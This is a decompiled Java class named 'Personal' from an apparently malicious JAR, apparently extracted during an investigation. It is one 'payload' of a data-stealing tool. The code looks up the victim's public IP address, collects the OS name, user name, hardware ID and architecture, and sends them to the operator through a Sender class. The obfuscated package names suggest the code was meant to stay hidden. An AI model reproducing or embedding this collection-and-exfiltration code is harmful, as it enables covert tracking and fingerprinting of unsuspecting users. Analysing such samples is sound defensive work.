/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.HWIDUtil;
/*    */ import idasido.adldaosd.wpiw.util.Message;
/*    */ import java.net.URL;
/*    */ import java.util.Scanner;
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class Personal
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 16 */     String ip = (new Scanner((new URL("http://checkip.amazonaws.com")).openStream(), "UTF-8")).useDelimiter("\\A").next();
/*    */     
/* 18 */     Sender.send((new Message.Builder("Personal"))
/* 19 */         .addField("IP", ip, true)
/* 20 */         .addField("OS", System.getProperty("os.name"), true)
/* 21 */         .addField("Name", System.getProperty("user.name"), true)
/* 22 */         .addField("HWID", HWIDUtil.getID(), true)
/* 23 */         .addField("Arch", System.getProperty("os.arch"), true)
/* 24 */         .build());
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\Personal.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */